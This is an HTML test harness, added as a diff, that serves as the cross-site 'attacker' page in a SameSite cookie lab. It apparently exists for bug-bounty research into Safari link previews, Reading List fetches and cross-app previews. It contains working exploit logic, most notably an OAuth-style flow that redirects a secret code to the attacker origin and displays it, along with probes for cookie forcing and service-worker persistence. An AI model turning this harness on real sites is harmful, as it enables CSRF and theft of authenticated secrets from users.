@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="unsafe-url">
+<title>Cross-site initiator — SameSite preview lab</title>
+<style>
+ :root{color-scheme:dark}
+ body{margin:0;font:16px/1.5 -apple-system,BlinkMacSystemFont,"SF Pro Text",system-ui,sans-serif;
+      background:#0d0f14;color:#e8eaf0;padding:18px;max-width:780px;margin:0 auto}
+ h1{font-size:21px;margin:0 0 4px}
+ .note{font-size:13.5px;opacity:.7;margin:0 0 18px}
+ h2{font-size:13px;text-transform:uppercase;letter-spacing:1px;opacity:.55;
+    margin:26px 0 10px;border-top:1px solid #222733;padding-top:16px}
+ .card{background:#141822;border-radius:12px;padding:14px 16px;margin:0 0 12px}
+ .card p{margin:6px 0 0;font-size:13.5px;opacity:.78}
+ a.t{display:inline-block;font-size:17px;font-weight:700;color:#7fb0ff;
+     text-decoration:none;word-break:break-all}
+ a.t:hover{text-decoration:underline}
+ .how{display:inline-block;background:#232a38;border-radius:6px;padding:2px 8px;
+      font-size:11.5px;font-weight:700;letter-spacing:.4px;margin:0 5px 5px 0;color:#9fb3d9}
+ input{background:#0a0c11;border:1px solid #2a3140;color:#e8eaf0;border-radius:8px;
+       padding:8px 10px;font:13px ui-monospace,Menlo,monospace;width:100%;box-sizing:border-box}
+ code{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;background:#0a0c11;
+      padding:1px 5px;border-radius:4px}
+ #caught{background:#7f1020;box-shadow:inset 0 0 0 2px #ff4d6a;border-radius:12px;
+         padding:16px;margin:14px 0;display:none}
+ #samesitewarn{background:#7f1020;box-shadow:inset 0 0 0 3px #ff4d6a;border-radius:12px;
+         padding:18px;margin:14px 0;display:none}
+ #samesitewarn b{font-size:19px}
+ .ok{color:#35d07f}.bad{color:#ff4d6a}
+</style>
+
+<h1>Cross-site initiator</h1>
+<p class="note">This page must be served from a <b>different registrable domain</b> than the
+victim lab (GitHub Pages is on the Public Suffix List, so <code>*.github.io</code> is its own
+site). Seed cookies at <code>/setup</code> on the victim origin first, then run each gesture
+below and watch the victim's <code>/log</code>.</p>
+
+<label class="note" for="base">Victim origin</label>
+<input id="base" value="https://1.hackeronce.com">
+
+<div id="samesitewarn">
+  <b>STOP — this page is same-site with the victim.</b>
+  <p id="samesitewhy" style="margin:8px 0 0;font-size:14px"></p>
+  <p style="margin:8px 0 0;font-size:14px">Every result below will show Strict cookies
+  being sent, and every one of them will be a false positive, because a same-site
+  initiator is <i>supposed</i> to send them. SameSite compares registrable domains, so
+  a different subdomain or a different path on the same host does not help. Serve this
+  page from a different registrable domain.</p>
+</div>
+
+<div id="caught">
+  <b>Code received by the attacker origin:</b>
+  <div><code id="caughtcode"></code></div>
+</div>
+
+<h2>A · Control — plain link click</h2>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="A-normal-click">Open victim /probe (normal click)</a>
+  <p><span class="how">LEFT CLICK / TAP</span> Expected: <span class="ok">strict NOT sent</span>,
+  Lax sent. If Strict appears here, something is wrong with your setup — fix that before
+  trusting any result below.</p>
+</div>
+
+<h2>B · iOS / iPadOS Safari — long-press link preview</h2>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="B-ios-longpress-peek">Long-press me to preview</a>
+  <p><span class="how">TOUCH &amp; HOLD → preview popover</span>
+  The popover performs a real page load. If the victim log shows
+  <span class="bad">STRICT SENT</span> for this tag, that is the bug. Do <b>not</b> tap through
+  to open — dismiss the popover, the request has already been made.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="C-ios-longpress-readinglist">Long-press → Add to Reading List</a>
+  <p><span class="how">TOUCH &amp; HOLD → Add to Reading List</span>
+  Reading List saves an offline copy, which means a background fetch of the URL from a
+  cross-site context. Separate code path from the peek; test it separately.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/download" data-tag="D-ios-download-linked-file">Long-press → Download Linked File</a>
+  <p><span class="how">TOUCH &amp; HOLD → Download Linked File</span>
+  Context-menu download of a cross-site link. Check the log entry's cookie list.</p>
+</div>
+
+<h2>C · macOS Safari — force-click preview</h2>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="E-macos-forceclick-preview">Force-click me to preview</a>
+  <p><span class="how">FORCE CLICK (one finger, press firmly)</span>
+  <span class="how">OR THREE-FINGER TAP</span>
+  Requires a Force Touch trackpad. If three-finger tap does nothing, set
+  System Settings → Trackpad → Point &amp; Click → "Look up &amp; data detectors" to
+  <i>Tap with three fingers</i>.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="F-macos-readinglist">Right-click → Add Link to Reading List</a>
+  <p><span class="how">RIGHT CLICK → Add Link to Reading List</span>
+  Then open the Reading List sidebar; the offline archive fetch may be deferred until
+  the item is first shown. Watch the log across both moments.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/download" data-tag="G-macos-download-linked-file">Right-click → Download Linked File</a>
+  <p><span class="how">RIGHT CLICK → Download Linked File</span>
+  Ties directly into download-origin handling.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="H-macos-open-in-new-tab">Right-click → Open Link in New Tab</a>
+  <p><span class="how">RIGHT CLICK → Open in New Tab</span> Control case: this is still a
+  cross-site initiation, so Strict must stay blocked. If it leaks here too, the bug is much
+  broader than previews.</p>
+</div>
+
+<h2>D · Cross-app initiation (strongest cross-site story)</h2>
+<div class="card">
+  <a class="t" data-p="/probe" data-tag="I-mail-message-longpress">Copy this link into Mail / Messages / Notes</a>
+  <p><span class="how">SEND TO YOURSELF → TOUCH &amp; HOLD</span>
+  Peek-and-pop is a system behaviour, not a Safari one. A link previewed from an
+  attacker-sent email or message has no same-site relationship to the victim at all, which
+  makes the "the initiator was cross-site" argument unarguable at triage.</p>
+</div>
+
+<h2>E · Side effects worth measuring</h2>
+<div class="card">
+  <a class="t" data-p="/probe-setcookie" data-tag="J-cookie-write-from-preview">Preview me, then check the jar</a>
+  <p>Does a <code>Set-Cookie</code> returned during a preview persist into the real cookie
+  jar? If yes that is cookie forcing / session fixation, a second finding.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/sw-test" data-tag="K-service-worker-from-preview">Preview me (service worker)</a>
+  <p>Can a previewed page register a service worker? That converts a transient preview into
+  persistence on the victim origin.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/slow?ms=5000" data-tag="L-dismiss-before-load">Preview me, dismiss immediately</a>
+  <p>Response is delayed 5s. Dismiss the popover at once. If the log still records the hit,
+  the server-side side effect happens whether or not the user ever sees the page — that kills
+  the "but the user chose to preview it" counter-argument.</p>
+</div>
+<div class="card">
+  <a class="t" data-p="/redir" data-tag="M-cross-site-redirect" data-redir="1">Preview me (victim → cross-site redirect)</a>
+  <p>Does the preview follow a redirect off the victim origin, and does the attacker origin
+  receive the resulting request?</p>
+</div>
+
+<h2>F · Escalation — authenticated secret exfiltration</h2>
+<div class="card">
+  <a class="t" data-p="/authorize" data-tag="N-oauth-code-theft" data-auth="1">Preview me (OAuth-style code theft)</a>
+  <p><code>/authorize</code> mints a secret <b>only</b> if the Strict cookie arrives, then
+  302s it to a redirect_uri on this attacker origin. This is the difference between
+  "blind GET CSRF" and "attacker reads an authenticated secret" — and the difference
+  between a courtesy payout and a real one. The callback page below catches the code and
+  broadcasts it back to this tab.</p>
+</div>
+
+<script>
+(function () {
+  var base = document.getElementById('base');
+  function origin() { return base.value.replace(/\/+$/, ''); }
+  // pathname only — location.href would drag a query string or #hash into the path
+  var cb = location.origin + location.pathname.replace(/[^\/]*$/, '') + 'callback.html';
+
+  function build(a) {
+    var p = a.dataset.p, tag = a.dataset.tag, n = Date.now().toString(36)
+            + Math.random().toString(36).slice(2, 8);
+    var u = origin() + p + (p.indexOf('?') > -1 ? '&' : '?')
+            + 'tag=' + encodeURIComponent(tag) + '&n=' + n;
+    if (a.dataset.redir) u += '&to=' + encodeURIComponent(cb + '?what=redirect');
+    if (a.dataset.auth)  u += '&redirect_uri='
+        + encodeURIComponent(cb + '?lab=' + encodeURIComponent(origin()));
+    a.href = u;
+  }
+
+  // Structural guard: if this page is same-site with the victim, nothing below is
+  // a valid test. Naive eTLD+1 by last two labels — fine for the domains in use,
+  // and it only ever produces a warning, never a silent pass.
+  function reg(host) {
+    var p = host.split('.');
+    return p.length <= 2 ? host : p.slice(-2).join('.');
+  }
+  function checkSameSite() {
+    var warn = document.getElementById('samesitewarn');
+    try {
+      var vh = new URL(origin()).hostname, ah = location.hostname;
+      var same = reg(vh) === reg(ah);
+      warn.style.display = same ? 'block' : 'none';
+      if (same) {
+        document.getElementById('samesitewhy').textContent =
+          'This page is served from ' + ah + ' and the victim is ' + vh
+          + '. Both sit under the registrable domain ' + reg(ah) + '.';
+      }
+    } catch (e) { warn.style.display = 'none'; }
+  }
+  var links = [].slice.call(document.querySelectorAll('a.t'));
+  function refresh() { links.forEach(build); checkSameSite(); }
+  refresh();
+  base.addEventListener('input', refresh);
+  // fresh nonce on every interaction so no result is ever a cache hit
+  ['pointerdown', 'contextmenu', 'touchstart'].forEach(function (ev) {
+    document.addEventListener(ev, function (e) {
+      var a = e.target.closest && e.target.closest('a.t'); if (a) build(a);
+    }, true);
+  });
+
+  function show(code) {
+    document.getElementById('caught').style.display = 'block';
+    document.getElementById('caughtcode').textContent = code;
+  }
+  try {
+    var seen = localStorage.getItem('samesite_lab_code');
+    if (seen) show(seen);
+    new BroadcastChannel('samesite_lab').onmessage = function (e) {
+      if (e.data && e.data.code) show(e.data.code);
+    };
+    addEventListener('storage', function (e) {
+      if (e.key === 'samesite_lab_code' && e.newValue) show(e.newValue);
+    });
+  } catch (err) {}
+})();
+</script>
